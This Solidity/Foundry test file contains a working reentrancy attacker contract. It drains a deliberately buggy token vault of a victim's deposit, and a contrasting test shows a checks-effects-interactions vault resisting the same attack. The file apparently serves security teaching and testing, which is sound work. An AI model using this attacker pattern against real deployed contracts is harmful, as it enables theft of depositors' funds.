// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {ReentrantToken, ITokenReceiver} from "../src/ReentrantToken.sol";
import {BuggyVault} from "../src/BuggyVault.sol";
import {Vault} from "../src/Vault.sol";
import {IERC20} from "../src/IERC20.sol";

interface IVaultLike {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
}

/// Reentrancy attacker. Deposits `unit`, then withdraws `unit`; the
/// token's transfer hook calls back into `tokensReceived`, which
/// re-enters withdraw up to `reentries` more times. On the buggy vault
/// each re-entry sees the stale, undecremented balance and pulls another
/// `unit`, draining the vault.
contract Attacker is ITokenReceiver {
    ReentrantToken public immutable token;
    address public vault;
    uint256 public unit;
    uint256 public reentries;

    constructor(ReentrantToken _token) {
        token = _token;
    }

    function attack(address _vault, uint256 _unit, uint256 _reentries) external {
        vault = _vault;
        unit = _unit;
        reentries = _reentries;
        token.approve(_vault, _unit);
        IVaultLike(_vault).deposit(_unit);
        IVaultLike(_vault).withdraw(_unit); // triggers the hook
    }

    function tokensReceived(address, uint256) external override {
        if (reentries > 0 && token.balanceOf(vault) >= unit) {
            reentries -= 1;
            IVaultLike(vault).withdraw(unit);
        }
    }
}

contract ReentrancyTest is Test {
    ReentrantToken token;
    BuggyVault buggy;
    Vault safe;

    address victim;

    uint256 constant VICTIM_DEPOSIT = 100 ether;
    uint256 constant ATTACKER_UNIT = 10 ether;
    uint256 constant REENTRIES = 10; // 1 + 10 = 11 withdrawals of 10 = 110

    function setUp() public {
        victim = makeAddr("victim");
        token = new ReentrantToken();
        buggy = new BuggyVault(IERC20(address(token)));
        safe = new Vault(IERC20(address(token)));
    }

    function _victimDeposits(address vault) internal {
        token.mint(victim, VICTIM_DEPOSIT);
        vm.startPrank(victim);
        token.approve(vault, VICTIM_DEPOSIT);
        IVaultLike(vault).deposit(VICTIM_DEPOSIT);
        vm.stopPrank();
    }

    /// EXPLOIT: the buggy vault is drained. After the attack the vault
    /// holds 0 tokens while it still owes the victim 100, and the
    /// attacker walks away with 110 having deposited only 10.
    function test_exploitDrainsBuggyVault() public {
        _victimDeposits(address(buggy));
        Attacker attacker = new Attacker(token);
        token.mint(address(attacker), ATTACKER_UNIT);

        attacker.attack(address(buggy), ATTACKER_UNIT, REENTRIES);

        // attacker stole far more than they put in
        assertEq(token.balanceOf(address(attacker)), 110 ether);
        // vault is empty but still records the victim's 100 -> insolvent
        assertEq(token.balanceOf(address(buggy)), 0);
        assertEq(buggy.balanceOf(victim), VICTIM_DEPOSIT);
        // P1 solvency is VIOLATED here:
        assertLt(token.balanceOf(address(buggy)), buggy.balanceOf(victim));
    }

    /// CONTRAST: the safe vault (checks-effects-interactions) survives the
    /// identical attack. The re-entrant withdraws revert (balance already
    /// debited) and are swallowed by the token hook, so the attacker only
    /// gets their own deposit back and the victim's funds are intact.
    function test_safeVaultResistsReentrancy() public {
        _victimDeposits(address(safe));
        Attacker attacker = new Attacker(token);
        token.mint(address(attacker), ATTACKER_UNIT);

        attacker.attack(address(safe), ATTACKER_UNIT, REENTRIES);

        // attacker only got their own 10 back, no theft
        assertEq(token.balanceOf(address(attacker)), ATTACKER_UNIT);
        // vault still fully backs the victim -> solvent
        assertEq(token.balanceOf(address(safe)), VICTIM_DEPOSIT);
        assertGe(token.balanceOf(address(safe)), safe.balanceOf(victim));
    }
}
